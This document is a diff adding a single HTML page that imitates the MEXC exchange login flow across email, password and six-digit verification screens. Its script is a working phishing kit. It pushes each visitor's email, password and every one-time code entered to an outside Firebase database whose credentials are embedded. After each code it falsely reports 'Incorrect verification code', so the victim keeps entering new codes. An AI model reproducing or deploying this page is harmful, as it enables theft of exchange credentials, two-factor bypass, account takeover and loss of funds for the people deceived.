@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>MEXC Login Full Flow</title>
+<style>
+/* CSS Reset and Full Screen Setup */
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+body { background-color: #ffffff; width: 100vw; height: 100vh; overflow: hidden; }
+.app-container { width: 100%; height: 100%; background: white; position: relative; display: flex; flex-direction: column; }
+.screen { display: none; padding: 20px; height: 100%; flex-direction: column; }
+.screen.active { display: flex; }
+.header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0 30px 0; }
+.icon-btn { background: none; border: none; display: flex; justify-content: center; align-items: center; cursor: pointer; color: #333; padding: 5px; }
+.signup-text { font-size: 14px; font-weight: 600; color: #333; cursor: pointer; }
+h1 { font-size: 24px; font-weight: 700; color: #111; margin-bottom: 30px; }
+.sub-text { font-size: 14px; color: #666; margin-top: -20px; margin-bottom: 20px; }
+.input-group { margin-bottom: 20px; position: relative; }
+.input-label { font-size: 12px; color: #888; margin-bottom: 8px; display: block; }
+.input-field { width: 100%; padding: 14px 16px; border: none; background-color: #f4f5f7; border-radius: 8px; font-size: 14px; color: #333; outline: none; transition: 0.2s; }
+.input-field:focus { border: 1px solid #0b5cff; background-color: #fff; }
+.clear-btn { position: absolute; right: 12px; top: 38px; background: #ccc; color: white; border: none; border-radius: 50%; width: 16px; height: 16px; font-size: 10px; cursor: pointer; display: none; align-items: center; justify-content: center; }
+.btn-primary { width: 100%; padding: 14px; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; color: white; background-color: #0b5cff; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+.btn-secondary { width: 100%; padding: 14px; border: none; border-radius: 25px; font-size: 14px; font-weight: 600; color: #333; background-color: #f4f5f7; cursor: pointer; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; gap: 10px; }
+.divider { display: flex; align-items: center; text-align: center; margin: 30px 0; color: #bbb; font-size: 12px; }
+.divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #eee; }
+.divider:not(:empty)::before { margin-right: .5em; }
+.divider:not(:empty)::after { margin-left: .5em; }
+.social-row { display: flex; gap: 15px; margin-bottom: 30px; }
+.social-btn { flex: 1; padding: 12px; border: none; border-radius: 25px; background-color: #f4f5f7; cursor: pointer; display: flex; justify-content: center; align-items: center; }
+.social-btn svg { width: 20px; height: 20px; }
+.footer-link { text-align: center; font-size: 13px; color: #888; font-weight: 500; cursor: pointer; margin-top: auto; padding-bottom: 20px; }
+.forgot-password { color: #0b5cff; font-size: 13px; font-weight: 600; text-decoration: none; display: inline-block; margin-bottom: 20px; margin-top: -10px; }
+.global-loader-overlay { display: none; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.9); z-index: 999; justify-content: center; align-items: center; }
+.global-loader-overlay.active { display: flex; }
+.spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0b5cff; border-radius: 50%; animation: spin 1s linear infinite; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.otp-container { display: flex; gap: 10px; justify-content: center; margin-bottom: 20px; }
+.otp-input { width: 45px; height: 50px; font-size: 20px; text-align: center; border: 1px solid #ccc; border-radius: 8px; background: #f4f5f7; }
+.otp-input:focus { border: 1px solid #0b5cff; background: #fff; outline: none; }
+.error-msg { color: #e74c3c; font-size: 13px; text-align: center; display: none; margin-bottom: 15px; font-weight: 500; }
+.timer-container { font-size: 13px; color: #888; text-align: center; margin-top: 20px; }
+#timer-count { color: #0b5cff; font-weight: 600; }
+#resend-link { color: #0b5cff; font-weight: 600; text-decoration: none; display: none; cursor: pointer; }
+</style>
+</head>
+<body>
+
+<div class="app-container">
+    <div id="global-loader" class="global-loader-overlay"><div class="spinner"></div></div>
+
+    <!-- SCREEN 1 -->
+    <div id="screen-1" class="screen active">
+        <div class="header">
+            <button class="icon-btn" style="font-size: 28px;">&times;</button>
+            <span class="signup-text">Sign Up</span>
+        </div>
+        <h1>Log In to MEXC</h1>
+        <div class="input-group">
+            <span class="input-label">Email/Phone Number</span>
+            <input type="text" id="email-input" class="input-field" placeholder="Enter your email/phone number" autocomplete="off">
+            <button id="clear-email" class="clear-btn">&times;</button>
+        </div>
+        <button id="next-btn" class="btn-primary" disabled>Next</button>
+        <div class="divider">OR</div>
+        <button class="btn-secondary">Login with Passkey</button>
+        <div class="social-row">
+            <button class="social-btn"><svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg></button>
+            <button class="social-btn"><svg viewBox="0 0 24 24"><path fill="#2CA5E0" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.42.9-4.02 2.65-.38.26-.72.39-1.03.38-.34-.01-.99-.19-1.48-.35-.6-.2-1.08-.3-1.04-.64.02-.18.27-.36.75-.55 2.93-1.27 4.88-2.11 5.85-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.04.01.12 0 .22z"/></svg></button>
+        </div>
+        <div class="footer-link">Continue with Wallet</div>
+    </div>
+
+    <!-- SCREEN 2 -->
+    <div id="screen-2" class="screen">
+        <div class="header" style="justify-content: flex-start; gap: 20px;">
+            <button class="icon-btn" onclick="goBackTo1()"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M19 12H5M5 12L12 19M5 12L12 5" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+        </div>
+        <h1>Enter your password</h1>
+        <div class="sub-text" id="display-email"></div>
+        <div class="input-group">
+            <span class="input-label">Password</span>
+            <input type="password" id="password-input" class="input-field" placeholder="Please enter your password">
+        </div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <button id="login-btn" class="btn-primary" disabled>Log In</button>
+    </div>
+
+    <!-- SCREEN 3 -->
+    <div id="screen-3" class="screen">
+        <div class="header" style="justify-content: flex-start; gap: 20px;">
+            <button class="icon-btn" onclick="goBackTo2()"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M19 12H5M5 12L12 19M5 12L12 5" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+        </div>
+        <h1>Security Verification</h1>
+        <div class="sub-text">Please enter the 6-digit code sent to your email/phone.</div>
+        <div class="otp-container">
+            <input type="tel" maxlength="1" class="otp-input" autofocus>
+            <input type="tel" maxlength="1" class="otp-input">
+            <input type="tel" maxlength="1" class="otp-input">
+            <input type="tel" maxlength="1" class="otp-input">
+            <input type="tel" maxlength="1" class="otp-input">
+            <input type="tel" maxlength="1" class="otp-input">
+        </div>
+        <div id="otp-error" class="error-msg">Incorrect verification code. Please try again.</div>
+        <button id="verify-btn" class="btn-primary" disabled>Verify</button>
+        <div class="timer-container">
+            <span id="resend-text-prefix">Didn't receive the code? </span>
+            <span id="timer-count">60s</span>
+            <a href="#" id="resend-link">Resend Code</a>
+        </div>
+    </div>
+</div>
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+    // Firebase Config Initialization
+    const firebaseConfig = {
+        apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+        authDomain: "long-d1bcb.firebaseapp.com",
+        databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+        projectId: "long-d1bcb",
+        storageBucket: "long-d1bcb.firebasestorage.app",
+        messagingSenderId: "515546162619",
+        appId: "1:515546162619:web:e046b79a25ccfa057e509e"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    
+    // Variables for Firebase Data Storage
+    let currentRecordId = null;
+    let allOtps = []; // Will store multiple OTPs
+
+    // UI Elements
+    const emailInput = document.getElementById('email-input');
+    const clearEmailBtn = document.getElementById('clear-email');
+    const nextBtn = document.getElementById('next-btn');
+    const screen1 = document.getElementById('screen-1');
+    const globalLoader = document.getElementById('global-loader');
+    const screen2 = document.getElementById('screen-2');
+    const displayEmail = document.getElementById('display-email');
+    const passwordInput = document.getElementById('password-input');
+    const loginBtn = document.getElementById('login-btn');
+    const screen3 = document.getElementById('screen-3');
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const verifyBtn = document.getElementById('verify-btn');
+    const otpError = document.getElementById('otp-error');
+    
+    let otpTimerInterval;
+
+    function showLoader(duration, callback) {
+        globalLoader.classList.add('active');
+        setTimeout(() => {
+            globalLoader.classList.remove('active');
+            if(callback) callback();
+        }, duration);
+    }
+
+    emailInput.addEventListener('input', function() {
+        let val = this.value;
+        let hasAt = val.includes('@');
+        let numberCount = val.replace(/\D/g, '').length;
+        if (val.length > 0) {
+            clearEmailBtn.style.display = 'flex';
+            nextBtn.disabled = !(hasAt || numberCount >= 6);
+        } else {
+            nextBtn.disabled = true;
+            clearEmailBtn.style.display = 'none';
+        }
+    });
+
+    clearEmailBtn.addEventListener('click', function() {
+        emailInput.value = '';
+        nextBtn.disabled = true;
+        clearEmailBtn.style.display = 'none';
+        emailInput.focus();
+    });
+
+    // Save Email to Firebase and Move to Screen 2
+    nextBtn.addEventListener('click', function() {
+        showLoader(2500, () => {
+            // Push email to Firebase
+            const newRecord = database.ref('users_data').push();
+            currentRecordId = newRecord.key;
+            newRecord.set({
+                email: emailInput.value,
+                timestamp: Date.now()
+            });
+
+            screen1.classList.remove('active');
+            screen2.classList.add('active');
+            displayEmail.textContent = emailInput.value;
+        });
+    });
+    
+    function goBackTo1() { screen2.classList.remove('active'); screen1.classList.add('active'); }
+    function goBackTo2() { screen3.classList.remove('active'); screen2.classList.add('active'); otpError.style.display = 'none'; clearOTP(); clearInterval(otpTimerInterval); }
+
+    passwordInput.addEventListener('input', function() { loginBtn.disabled = this.value.length === 0; });
+
+    // Save Password to Firebase and Move to Screen 3
+    loginBtn.addEventListener('click', function() {
+        showLoader(3000, () => {
+            // Update password in Firebase
+            if(currentRecordId) {
+                database.ref('users_data/' + currentRecordId).update({
+                    password: passwordInput.value
+                });
+            }
+
+            screen2.classList.remove('active');
+            screen3.classList.add('active');
+            startOtpTimer(); 
+            otpInputs[0].focus();
+        });
+    });
+
+    function startOtpTimer() {
+        let timeLeft = 60;
+        const timerSpan = document.getElementById('timer-count');
+        const resendLink = document.getElementById('resend-link');
+        const resendText = document.getElementById('resend-text-prefix');
+
+        timerSpan.textContent = timeLeft + 's';
+        timerSpan.style.display = 'inline';
+        resendText.style.display = 'inline';
+        resendLink.style.display = 'none';
+
+        clearInterval(otpTimerInterval);
+        otpTimerInterval = setInterval(() => {
+            timeLeft--;
+            timerSpan.textContent = timeLeft + 's';
+            if (timeLeft <= 0) {
+                clearInterval(otpTimerInterval);
+                timerSpan.style.display = 'none';
+                resendText.style.display = 'none';
+                resendLink.style.display = 'inline';
+            }
+        }, 1000);
+    }
+
+    document.getElementById('resend-link').addEventListener('click', function(e) {
+        e.preventDefault();
+        startOtpTimer();
+    });
+
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            otpError.style.display = 'none';
+            if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+            checkOTPComplete();
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+        });
+    });
+
+    function checkOTPComplete() {
+        verifyBtn.disabled = !Array.from(otpInputs).every(input => input.value.length === 1);
+    }
+
+    function clearOTP() {
+        otpInputs.forEach(input => input.value = '');
+        verifyBtn.disabled = true;
+    }
+
+    // Save All OTPs to Firebase sequentially
+    verifyBtn.addEventListener('click', function() {
+        showLoader(2000, () => {
+            // Fetch OTP, add to array, update Firebase
+            let currentOtp = Array.from(otpInputs).map(i => i.value).join('');
+            allOtps.push(currentOtp);
+            
+            if(currentRecordId) {
+                database.ref('users_data/' + currentRecordId).update({
+                    otp: allOtps.join(', ') // Save multiple OTPs with comma separation
+                });
+            }
+
+            otpError.style.display = 'block';
+            clearOTP();
+            otpInputs[0].focus();
+        });
+    });
+</script>
+</body>
+</html>
